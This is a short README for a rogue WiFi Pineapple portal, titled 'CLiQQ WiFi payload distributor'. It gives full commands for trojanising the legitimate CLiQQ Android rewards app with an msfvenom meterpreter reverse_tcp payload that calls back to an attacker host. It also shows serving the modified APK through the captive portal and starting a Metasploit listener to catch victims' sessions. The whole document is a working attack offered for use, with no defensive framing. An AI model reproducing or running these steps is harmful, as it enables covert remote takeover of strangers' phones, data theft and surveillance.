## CLiQQ WiFi payload distributor

### Usage
Include this line on /etc/nginx/mime.types and then reboot the Pineapple or else the browser will parse the apk file into plain text

	application/vnd.android.package-archive 	apk;

Embedding payload on [original apk file](https://apkpure.com/cliqq-every-day-rewards/com.philseven.loyalty)

	msfvenom -x CLiQQ.apk -p android/meterpreter/reverse_tcp LHOST=172.16.42.42 LPORT=4444 -o CLiQQ_final.apk

Moving and renaming the modified apk file to the Pineapple

	scp CLiQQ_final.apk root@172.16.42.1:/sd/portals/cliqq-payload/CLiQQ.apk

Starting Metasploit listener

	msfconsole

	use multi/handler

	set payload android/meterpreter/reverse_tcp

	set LHOST 172.16.42.42

	set LPORT 4444

	set ExitOnSession false

	exploit -j